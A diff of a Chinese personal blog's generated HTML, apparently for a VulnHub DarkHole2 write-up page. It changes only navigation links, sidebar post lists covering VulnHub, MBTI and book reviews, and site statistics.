+          <li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2021/11/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2021/11/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2021/11/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2021/11/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2021/11/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2021/11/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB 23 KEYRING">VULNHUB 23 KEYRING</a></li><li><a href="/2021/11/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></li><li><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB 25 SNAKEOIL">VULNHUB 25 SNAKEOIL</a></li><li><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB 24 HACKABLELL">VULNHUB 24 HACKABLELL</a></li><li><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB 29 PRESIDENTIAL">VULNHUB 29 PRESIDENTIAL</a></li><li><a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB 27 TYPO">VULNHUB 27 TYPO</a></li><li><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB 26 HACKERKID">VULNHUB 26 HACKERKID</a></li><li><a href="/2021/11/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB 21 RIPPER">VULNHUB 21 RIPPER</a></li><li><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB 30 MOMENTUM2">VULNHUB 30 MOMENTUM2</a></li><li><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB 34 GROTESQUE2">VULNHUB 34 GROTESQUE2</a></li><li><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB 35 HACKABLE3">VULNHUB 35 HACKABLE3</a></li><li><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB 28 BLUEMOON">VULNHUB 28 BLUEMOON</a></li><li><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB 36 GROTESQUE1">VULNHUB 36 GROTESQUE1</a></li><li><a href="/2021/11/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB 37 VENUS">VULNHUB 37 VENUS</a></li><li><a href="/2021/11/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB 32 JETTY">VULNHUB 32 JETTY</a></li><li><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB 38 BLUESOMKE">VULNHUB 38 BLUESOMKE</a></li><li><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB 31 PROXIMACENTAURI">VULNHUB 31 PROXIMACENTAURI</a></li><li><a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB 39 INFERNO">VULNHUB 39 INFERNO</a></li><li><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB 33 GROTESQUE3">VULNHUB 33 GROTESQUE3</a></li><li class="active"><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB 42 DARKHOLE2">VULNHUB 42 DARKHOLE2</a></li><li><a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB 44 CEREAL">VULNHUB 44 CEREAL</a></li><li><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB 41 CENGBOX3">VULNHUB 41 CENGBOX3</a></li><li><a href="/2021/11/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB 45 TORANDO">VULNHUB 45 TORANDO</a></li><li><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB 46 NEMESIS">VULNHUB 46 NEMESIS</a></li><li><a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB 43 ORASI">VULNHUB 43 ORASI</a></li><li><a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB 40 LOOZ">VULNHUB 40 LOOZ</a></li><li><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB 47 WARZONE3">VULNHUB 47 WARZONE3</a></li><li><a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB 48 GITROOT">VULNHUB 48 GITROOT</a></li><li><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB 50 POWERGRID">VULNHUB 50 POWERGRID</a></li><li><a href="/2021/11/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB 49 DURIAN">VULNHUB 49 DURIAN</a></li>
         </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
@@ -605,12 +582,12 @@ EOF<br>
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+        <a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+        <a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -632,40 +609,10 @@ EOF<br>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
 </div>
 
-    <span><a href="/2020/04/01/MBTI/%E5%88%BB%E6%9D%BF%E5%8D%B0%E8%B1%A1/" title="刻板印象">刻板印象</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
-</div>
-
-    <span><a href="/2020/04/01/MBTI/ESTP%E8%A7%A3%E8%AF%BB/" title="ESTP解读">ESTP解读</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
-</div>
-
-    <span><a href="/2020/04/01/MBTI/%E4%B9%9D%E5%9E%8B%E4%BA%BA%E6%A0%BC/" title="九型人格">九型人格</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/33%E3%80%8A%E9%9B%BE%E9%83%BD%E5%AD%A4%E5%84%BF%E3%80%8B%E7%8B%84%E6%9B%B4%E6%96%AF/" title="《雾都孤儿》狄更斯">《雾都孤儿》狄更斯</a></span>
+    <span><a href="/2021/11/01/VULNHUB/127%20TYPO/" title="VULNHUB 27 TYPO">VULNHUB 27 TYPO</a></span>
   </li>
 
       
@@ -675,37 +622,7 @@ EOF<br>
 <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
 </div>
 
-    <span><a href="/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="XD22 9 权限提升">XD22 9 权限提升</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
-</div>
-
-    <span><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" title="VULNHUB 29 PRESIDENTIAL">VULNHUB 29 PRESIDENTIAL</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/4%E3%80%8A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC%E3%80%8B%E5%A4%AA%E5%AE%B0%E6%B2%BB/" title="《人间失格》太宰治">《人间失格》太宰治</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
-</div>
-
-    <span><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" title="VULNHUB 36 GROTESQUE1">VULNHUB 36 GROTESQUE1</a></span>
+    <span><a href="/2022/12/30/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" title="XD22 3 服务攻防">XD22 3 服务攻防</a></span>
   </li>
 
       
@@ -715,7 +632,17 @@ EOF<br>
 <a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
 </div>
 
-    <span><a href="/2020/04/01/MBTI/ENTJ%E8%A7%A3%E8%AF%BB/" title="ENTJ解读">ENTJ解读</a></span>
+    <span><a href="/2020/04/01/MBTI/%E5%BF%83%E7%90%86%E5%AD%A6%E5%90%8D%E8%AF%8D/" title="心理学名词">心理学名词</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2020/04/01/MBTI/MBTI%E4%B8%8E%E5%85%AB%E7%BB%B4/" title="MBTI与八维">MBTI与八维</a></span>
   </li>
 
       
@@ -725,7 +652,57 @@ EOF<br>
 <a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
 </div>
 
-    <span><a href="/2019/07/01/BOOK/60%E3%80%8A%E9%87%91%E9%A9%B4%E8%AE%B0%E3%80%8B%E9%98%BF%E6%99%AE%E5%88%97%E4%B9%8C%E6%96%AF/" title="《金驴记》阿普列乌斯">《金驴记》阿普列乌斯</a></span>
+    <span><a href="/2019/07/01/BOOK/68%E3%80%8A%E7%81%B5%E9%AD%82%E5%8F%AA%E8%83%BD%E7%8B%AC%E8%A1%8C%E3%80%8B%E5%91%A8%E5%9B%BD%E5%B9%B3/" title="《灵魂只能独行》周国平">《灵魂只能独行》周国平</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/63%E3%80%8A1984%E3%80%8B%E4%B9%94%E6%B2%BB%C2%B7%E5%A5%A5%E5%A8%81%E5%B0%94/" title="《1984》乔治·奥威尔">《1984》乔治·奥威尔</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2021/11/01/VULNHUB/139%20INFERNO/" title="VULNHUB 39 INFERNO">VULNHUB 39 INFERNO</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
+</div>
+
+    <span><a href="/2022/12/30/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="XD22 1 Web 基础知识">XD22 1 Web 基础知识</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/24%E3%80%8A%E7%AC%AC%E4%B8%83%E5%A4%A9%E3%80%8B%E4%BD%99%E5%8D%8E/" title="《第七天》余华">《第七天》余华</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></span>
   </li>
 
   </ul>
@@ -750,13 +727,13 @@ EOF<br>
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="站点总字数">748k 字</span>
+    <span title="站点总字数">746k 字</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="站点阅读时长">20:46</span>
+    <span title="站点阅读时长">20:44</span>
   </div>
 
 <!--   自定义开启一个网站的运行时间 -->
